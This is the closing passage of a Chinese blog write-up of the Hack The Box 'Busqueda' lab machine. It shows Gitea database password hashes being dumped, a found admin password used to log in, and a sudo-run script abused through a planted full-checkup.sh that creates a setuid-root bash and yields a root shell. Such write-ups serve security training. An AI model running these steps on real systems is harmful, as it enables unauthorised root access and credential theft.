class="hljs-string">| deploy_key                |</span><br><span class="hljs-string">| email_address             |</span><br><span class="hljs-string">| email_hash                |</span><br><span class="hljs-string">| external_login_user       |</span><br><span class="hljs-string">| follow                    |</span><br><span class="hljs-string">| foreign_reference         |</span><br><span class="hljs-string">| gpg_key                   |</span><br><span class="hljs-string">| gpg_key_import            |</span><br><span class="hljs-string">| hook_task                 |</span><br><span class="hljs-string">| issue                     |</span><br><span class="hljs-string">| issue_assignees           |</span><br><span class="hljs-string">| issue_content_history     |</span><br><span class="hljs-string">| issue_dependency          |</span><br><span class="hljs-string">| issue_index               |</span><br><span class="hljs-string">| issue_label               |</span><br><span class="hljs-string">| issue_user                |</span><br><span class="hljs-string">| issue_watch               |</span><br><span class="hljs-string">| label                     |</span><br><span class="hljs-string">| language_stat             |</span><br><span class="hljs-string">| lfs_lock                  |</span><br><span class="hljs-string">| lfs_meta_object           |</span><br><span class="hljs-string">| login_source              |</span><br><span class="hljs-string">| milestone                 |</span><br><span class="hljs-string">| mirror                    |</span><br><span class="hljs-string">| notice                    |</span><br><span class="hljs-string">| notification              |</span><br><span class="hljs-string">| oauth2_application        |</span><br><span class="hljs-string">| oauth2_authorization_code |</span><br><span class="hljs-string">| oauth2_grant              |</span><br><span class="hljs-string">| org_user                  |</span><br><span class="hljs-string">| package                   |</span><br><span class="hljs-string">| package_blob              |</span><br><span class="hljs-string">| package_blob_upload       |</span><br><span class="hljs-string">| package_file              |</span><br><span class="hljs-string">| package_property          |</span><br><span class="hljs-string">| package_version           |</span><br><span class="hljs-string">| project                   |</span><br><span class="hljs-string">| project_board             |</span><br><span class="hljs-string">| project_issue             |</span><br><span class="hljs-string">| protected_branch          |</span><br><span class="hljs-string">| protected_tag             |</span><br><span class="hljs-string">| public_key                |</span><br><span class="hljs-string">| pull_auto_merge           |</span><br><span class="hljs-string">| pull_request              |</span><br><span class="hljs-string">| push_mirror               |</span><br><span class="hljs-string">| reaction                  |</span><br><span class="hljs-string">| release                   |</span><br><span class="hljs-string">| renamed_branch            |</span><br><span class="hljs-string">| repo_archiver             |</span><br><span class="hljs-string">| repo_indexer_status       |</span><br><span class="hljs-string">| repo_redirect             |</span><br><span class="hljs-string">| repo_topic                |</span><br><span class="hljs-string">| repo_transfer             |</span><br><span class="hljs-string">| repo_unit                 |</span><br><span class="hljs-string">| repository                |</span><br><span class="hljs-string">| review                    |</span><br><span class="hljs-string">| review_state              |</span><br><span class="hljs-string">| session                   |</span><br><span class="hljs-string">| star                      |</span><br><span class="hljs-string">| stopwatch                 |</span><br><span class="hljs-string">| system_setting            |</span><br><span class="hljs-string">| task                      |</span><br><span class="hljs-string">| team                      |</span><br><span class="hljs-string">| team_invite               |</span><br><span class="hljs-string">| team_repo                 |</span><br><span class="hljs-string">| team_unit                 |</span><br><span class="hljs-string">| team_user                 |</span><br><span class="hljs-string">| topic                     |</span><br><span class="hljs-string">| tracked_time              |</span><br><span class="hljs-string">| two_factor                |</span><br><span class="hljs-string">| upload                    |</span><br><span class="hljs-string">| user                      |</span><br><span class="hljs-string">| user_badge                |</span><br><span class="hljs-string">| user_open_id              |</span><br><span class="hljs-string">| user_redirect             |</span><br><span class="hljs-string">| user_setting              |</span><br><span class="hljs-string">| version                   |</span><br><span class="hljs-string">| watch                     |</span><br><span class="hljs-string">| webauthn_credential       |</span><br><span class="hljs-string">| webhook                   |</span><br><span class="hljs-string">+---------------------------+</span><br><span class="hljs-string">91 rows in set (0.00 sec)</span><br><span class="hljs-string"></span><br><span class="hljs-string">mysql&gt; select name,email,passwd from user;</span><br><span class="hljs-string">+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-string">| name          | email                            | passwd                                                                                               |</span><br><span class="hljs-string">+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-string">| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |</span><br><span class="hljs-string">| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |</span><br><span class="hljs-string">+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-string">2 rows in set (0.00 sec)</span><br><span class="hljs-string"></span><br><span class="hljs-string">mysql&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>14、这里就获取到了网站的账号密码， 结合上面docker里的配置信息，我先本地绑定下hosts信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.208 gitea.searcher.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span> gitea.searcher.htb<br></code></pre></td></tr></table></figure>
+
+<p>15、访问下网站信息，并尝试登录</p>
+<p><code>http://gitea.searcher.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>administrator</code></p>
+<p><code>yuiu1hoiu4i5ho1uh</code></p>
+<p>16、登录后发现了是一个脚本的存放目录</p>
+<p><code>http://gitea.searcher.htb/administrator/scripts</code></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、在查看system-checkup.py脚本文件时，发现了可以提权的信息了</p>
+<p><code>http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py</code></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">elif action == <span class="hljs-string">&#x27;full-checkup&#x27;</span>:<br>    try:<br>        arg_list = [<span class="hljs-string">&#x27;./full-checkup.sh&#x27;</span>]<br>        print(run_command(arg_list))<br>        print(<span class="hljs-string">&#x27;[+] Done!&#x27;</span>)<br>    except:<br>        print(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>18、那就开始利用吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:~$ <br>svc@busqueda:~$ echo -e <span class="hljs-string">&#x27;#!/bin/bash\n\ncp /bin/bash /tmp/shiyan\nchmod 4777 /tmp/shiyan&#x27;</span> &gt; full-checkup.sh<br>svc@busqueda:~$ cat full-checkup.sh <br>#!/bin/bash<br><br>cp /bin/bash /tmp/shiyan<br>chmod <span class="hljs-number">4777</span> /tmp/shiyan<br>svc@busqueda:~$ chmod +x full-checkup.sh<br>svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup<br><br>[+] Done!<br>svc@busqueda:~$ ls -la /tmp/<br>total <span class="hljs-number">1424</span><br>drwxrwxrwt <span class="hljs-number">15</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">16</span>:<span class="hljs-number">28</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root root    <span class="hljs-number">4096</span> Mar  <span class="hljs-number">1</span>  <span class="hljs-number">2023</span> ..<br>drwxrwxrwt  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .font-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .ICE-unix<br>-rwsrwxrwx  <span class="hljs-number">1</span> root root <span class="hljs-number">1396520</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">16</span>:<span class="hljs-number">28</span> shiyan<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> snap-private-tmp<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> systemd-private-b88f04cdc08846789b6dd2072ab0e846-apache2.service-nFHZtG<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> systemd-private-b88f04cdc08846789b6dd2072ab0e846-ModemManager.service-tUFJj7<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> systemd-private-b88f04cdc08846789b6dd2072ab0e846-systemd-logind.service-s6NgWg<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> systemd-private-b88f04cdc08846789b6dd2072ab0e846-systemd-resolved.service-VHU8W7<br>drwx------  <span class="hljs-number">3</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> systemd-private-b88f04cdc08846789b6dd2072ab0e846-systemd-timesyncd.service-VhzhMA<br>drwxrwxrwt  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .Test-unix<br>drwx------  <span class="hljs-number">2</span> svc  svc     <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">15</span>:<span class="hljs-number">51</span> tmux<span class="hljs-number">-1000</span><br>drwx------  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> vmware-root_718<span class="hljs-number">-2957190230</span><br>drwxrwxrwt  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .X11-unix<br>drwxrwxrwt  <span class="hljs-number">2</span> root root    <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .XIM-unix<br>svc@busqueda:~$ cd /tmp/<br>svc@busqueda:/tmp$ ./shiyan -p<br>shiyan<span class="hljs-number">-5.1</span><span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">1000</span>(svc) gid=<span class="hljs-number">1000</span>(svc) euid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">1000</span>(svc)<br>shiyan<span class="hljs-number">-5.1</span>#<br></code></pre></td></tr></table></figure>
+
+<p>19、完美，读取下flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">shiyan<span class="hljs-number">-5.1</span><span class="hljs-meta"># cat /root/root.txt </span><br><span class="hljs-number">702</span>c7c58cf1e6093cfb9715a18ad6096<br>shiyan<span class="hljs-number">-5.1</span># <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/537</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Busqueda-htb-writeup</div>
+      <div>https://sh1yan.top/2024/04/19/Busqueda-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/16/Acute-htb-writeup/" title="Acute-htb-writeup">
+                        <span class="hidden-mobile">Acute-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
